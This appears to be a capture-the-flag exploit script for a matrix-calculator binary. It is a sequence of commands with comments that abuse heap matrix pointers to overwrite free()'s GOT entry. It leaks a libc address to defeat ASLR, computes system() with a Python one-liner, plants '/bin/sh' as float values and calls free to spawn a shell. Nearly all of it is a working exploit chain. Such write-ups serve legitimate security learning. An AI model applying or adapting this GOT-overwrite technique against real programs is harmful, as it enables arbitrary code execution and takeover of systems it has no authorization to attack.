create 1 1										// create and delete matrix to load free() into memory
destroy 0
create 1 1

create 6 5 										// create first matrix that allows writes into 2nd
create 1 1										// create 2nd matrix to use as a reference pointer
set 1 5 4 3.991161479476682e-34	(0x0804a10c)	// set location of 2nd matrix data to GOT of free()
get 2 0 0										// leak location of printf as a float (-9.39649969e+33=0xf7e7a440)
												
												// PICO SHELL SYSTEML: magic offset (free -> system) = -0x37d30
												// use this to calc system at runtime with aslr on
												// magical python one-liner:
												struct.unpack('>f', bytes.fromhex(hex(-0x37d30 + struct.unpack('<I', struct.pack('<f', -4.58897935e+33))[0])[2::]))[0]
												
set 2 0 0 <calculated value of system as float>	// write to 2nd matrix data location (GOT of free()) the 
												// location  of system()
												
					
set 1 0 0 1.8057175992480082e+28				// set "/bin/sh in 2nd matrix"
set 1 0 1 9.592211688248632e-39
												
destroy 1										// destroy and call free => call system("/bin/sh") and pwned